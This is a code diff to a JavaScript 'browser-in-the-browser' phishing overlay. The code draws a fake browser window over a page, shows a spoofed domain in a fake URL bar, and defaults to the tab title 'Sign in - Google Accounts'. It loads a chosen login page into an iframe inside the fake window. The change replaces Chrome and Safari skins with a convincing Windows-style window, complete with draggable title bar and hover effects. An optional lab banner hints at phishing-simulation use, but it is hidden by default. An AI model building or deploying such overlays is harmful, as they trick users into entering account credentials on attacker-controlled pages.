@@ -8,26 +8,8 @@
         return url.replace(/\/+$/, '');
     }
 
-    /* ── Browser detection ── */
-    function detectBrowser() {
-        var ua = navigator.userAgent || '';
-        // Safari: has 'Safari' but NOT 'Chrome' or 'Chromium' or 'CriOS'
-        if (/Safari/i.test(ua) && !/Chrome|Chromium|CriOS|Edg/i.test(ua)) {
-            return 'safari';
-        }
-        return 'chrome';
-    }
-
     function getOverlay() { return document.getElementById('bitbOverlay'); }
-
-    function getActiveFrame() {
-        var overlay = getOverlay();
-        if (!overlay) return null;
-        var b = overlay.dataset.bitbBrowser || 'chrome';
-        return b === 'safari'
-            ? document.getElementById('bitbFrameSafari')
-            : document.getElementById('bitbFrame');
-    }
+    function getFrame()   { return document.getElementById('bitbFrame');   }
 
     function entryPath() {
         var p = String(cfg().bitbEntryPath || '/index.php').trim();
@@ -35,7 +17,6 @@
         return p;
     }
 
-    /* ── Populate URL bar for both skins ── */
     function populateUrl(displayUrl) {
         var host = displayUrl, path = '';
         try {
@@ -43,42 +24,10 @@
             host = parsed.host;
             path = parsed.pathname + parsed.search + parsed.hash;
         } catch (_) {}
-
-        // Chrome skin
-        var domainEl = document.getElementById('bitbDomainName');
-        var pathEl   = document.getElementById('bitbUrlDisplay');
-        if (domainEl) domainEl.textContent = host;
-        if (pathEl)   pathEl.textContent   = path;
-
-        // Safari skin
-        var sDomain = document.getElementById('bitbSafariDomain');
-        var sPath   = document.getElementById('bitbSafariPath');
-        if (sDomain) sDomain.textContent = host;
-        if (sPath)   sPath.textContent   = path;
-    }
-
-    function populateTitle(title) {
-        var chromeEl = document.getElementById('bitbTabTitleText');
-        var safariEl = document.getElementById('bitbSafariTitle');
-        if (chromeEl) chromeEl.textContent = title;
-        if (safariEl) safariEl.textContent = title;
-    }
-
-    function populateFavicon(favUrl) {
-        var ids = ['bitbTabFavicon', 'bitbSafariFavicon', 'bitbSafariTabFavicon'];
-        ids.forEach(function (id) {
-            var el = document.getElementById(id);
-            if (el && favUrl) el.src = favUrl;
-        });
-    }
-
-    function populateLabel(label) {
-        ['bitbLabBanner', 'bitbLabBannerSafari'].forEach(function (id) {
-            var el = document.getElementById(id);
-            if (!el) return;
-            if (label) { el.textContent = label; el.hidden = false; }
-            else       { el.textContent = '';    el.hidden = true;  }
-        });
+        var d = document.getElementById('bitbWinDomainName');
+        var p = document.getElementById('bitbWinDomainPath');
+        if (d) d.textContent = host;
+        if (p) p.textContent = path;
     }
 
     function open() {
@@ -86,11 +35,8 @@
         if (!base) return false;
 
         var overlay = getOverlay();
-        if (!overlay) return false;
-
-        // Set browser skin
-        var browser = detectBrowser();
-        overlay.dataset.bitbBrowser = browser;
+        var frame   = getFrame();
+        if (!overlay || !frame) return false;
 
         var displayUrl = String(cfg().bitbDisplayUrl || base + entryPath()).trim();
         var tabTitle   = String(cfg().bitbTabTitle   || 'Sign in - Google Accounts').trim();
@@ -98,14 +44,20 @@
         var label      = String(cfg().bitbLabLabel   || '').trim();
 
         populateUrl(displayUrl);
-        populateTitle(tabTitle);
-        populateFavicon(fav);
-        populateLabel(label);
 
-        // Load iframe for the active skin only
-        var frame = getActiveFrame();
-        if (frame) frame.src = base + entryPath();
+        var titleEl = document.getElementById('bitbWinTitle');
+        if (titleEl) titleEl.textContent = tabTitle;
 
+        var favEl = document.getElementById('bitbWinFavicon');
+        if (favEl && fav) favEl.src = fav;
+
+        var labEl = document.getElementById('bitbLabBanner');
+        if (labEl) {
+            if (label) { labEl.textContent = label; labEl.hidden = false; }
+            else       { labEl.textContent = '';    labEl.hidden = true;  }
+        }
+
+        frame.src = base + entryPath();
         overlay.hidden = false;
         overlay.setAttribute('aria-hidden', 'false');
         document.body.style.overflow = 'hidden';
@@ -119,6 +71,7 @@
 
     function close() {
         var overlay = getOverlay();
+        var frame   = getFrame();
         if (!overlay) return;
 
         if (overlay._bitbOnKey) {
@@ -129,50 +82,36 @@
         overlay.hidden = true;
         overlay.setAttribute('aria-hidden', 'true');
         document.body.style.overflow = '';
-
-        // Blank both frames
-        ['bitbFrame', 'bitbFrameSafari'].forEach(function (id) {
-            var f = document.getElementById(id);
-            if (f) f.src = 'about:blank';
-        });
+        if (frame) frame.src = 'about:blank';
     }
 
-    /* ── Make window draggable by title/toolbar bar ── */
     function wireDraggable() {
-        var pairs = [
-            { win: 'bitbWindow',       bar: 'bitbTitleBar'    },
-            { win: 'bitbWindowSafari', bar: null               } // drag by toolbar
-        ];
+        var win    = document.getElementById('bitbWindow');
+        var handle = document.getElementById('bitbWinTitleBar');
+        if (!win || !handle) return;
 
-        pairs.forEach(function (p) {
-            var win = document.getElementById(p.win);
-            if (!win) return;
-            var handle = p.bar ? document.getElementById(p.bar) : win.querySelector('.safari-toolbar');
-            if (!handle) return;
+        var dragging = false, startX, startY, origLeft, origTop;
 
-            var dragging = false, startX, startY, origLeft, origTop;
-
-            handle.addEventListener('mousedown', function (e) {
-                if (e.target && e.target.closest && e.target.closest('[data-bitb-close]')) return;
-                dragging = true;
-                startX = e.clientX; startY = e.clientY;
-                var r = win.getBoundingClientRect();
-                origLeft = r.left; origTop = r.top;
-                win.style.position = 'fixed';
-                win.style.margin   = '0';
-                win.style.left     = origLeft + 'px';
-                win.style.top      = origTop  + 'px';
-                e.preventDefault();
-            });
-
-            document.addEventListener('mousemove', function (e) {
-                if (!dragging) return;
-                win.style.left = (origLeft + e.clientX - startX) + 'px';
-                win.style.top  = (origTop  + e.clientY - startY) + 'px';
-            });
-
-            document.addEventListener('mouseup', function () { dragging = false; });
+        handle.addEventListener('mousedown', function (e) {
+            if (e.target && e.target.closest && e.target.closest('[data-bitb-close]')) return;
+            dragging = true;
+            startX = e.clientX; startY = e.clientY;
+            var r = win.getBoundingClientRect();
+            origLeft = r.left; origTop = r.top;
+            win.style.position = 'fixed';
+            win.style.margin   = '0';
+            win.style.left     = origLeft + 'px';
+            win.style.top      = origTop  + 'px';
+            e.preventDefault();
         });
+
+        document.addEventListener('mousemove', function (e) {
+            if (!dragging) return;
+            win.style.left = (origLeft + e.clientX - startX) + 'px';
+            win.style.top  = (origTop  + e.clientY - startY) + 'px';
+        });
+
+        document.addEventListener('mouseup', function () { dragging = false; });
     }
 
     function wireCloseHandlers() {
@@ -182,6 +121,27 @@
         overlay.addEventListener('click', function (e) {
             if (e.target && e.target.closest && e.target.closest('[data-bitb-close]')) close();
         });
+
+        // Windows control button hover effects
+        var minBtn   = overlay.querySelector('.bitb-win-btn--min');
+        var maxBtn   = overlay.querySelector('.bitb-win-btn--max');
+        var closeBtn = overlay.querySelector('.bitb-win-btn--close');
+
+        function addHover(el, hoverBg, hoverColor) {
+            if (!el) return;
+            el.addEventListener('mouseover', function () {
+                el.style.backgroundColor = hoverBg;
+                el.style.color = hoverColor || '';
+            });
+            el.addEventListener('mouseout', function () {
+                el.style.backgroundColor = '';
+                el.style.color = '';
+            });
+        }
+
+        addHover(minBtn,   'rgba(0,0,0,0.1)', '');
+        addHover(maxBtn,   'rgba(0,0,0,0.1)', '');
+        addHover(closeBtn, '#e81123',          '#fff');
     }
 
     if (document.readyState === 'loading') {
